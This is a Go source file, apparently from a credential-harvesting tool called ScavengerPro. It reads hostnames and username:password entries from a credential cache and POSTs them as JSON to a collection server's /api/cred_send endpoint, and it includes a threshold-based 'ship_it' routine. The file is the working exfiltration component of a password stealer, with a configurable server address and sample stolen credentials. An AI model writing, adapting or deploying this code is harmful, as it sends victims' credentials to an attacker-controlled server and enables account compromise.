// ship the credential cache to the server
// @author: degenerat3

package main

import(
	"fmt"
	"net/http"
	"bytes"
	"encoding/json"
	"ScavengerPro/client/cred_cache"
)

var serv = "127.0.0.1:5000" 	//IP of server

func send_data(c cred_cache.CredCache){
	h := c.Get_hostname()
	creds := c.Get_entries()
	fmt.Printf("%s\n", h)
	fmt.Printf("%s\n", creds)
	url := "http://" + serv + "/api/cred_send"	//turn ip into URL
	jsonData := map[string]string{"hostname": h, "credentials": creds}
	jsonValue, _ := json.Marshal(jsonData)
	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
	if err != nil{
		// TODO: write to disk if it fails
		return
	}

}

func ship_it(c cred_cache.CredCache, min int){
	if c.Count_entries() < min{
		return	// not enough passwords to ship
	}
	send_data(c)
	return
}

func main(){
	c := cred_cache.CredCache {
		Hostname: "malBox",
		Credentials: []string{"root:hunter2","jim:letmein"},
	}
	send_data(c)
}
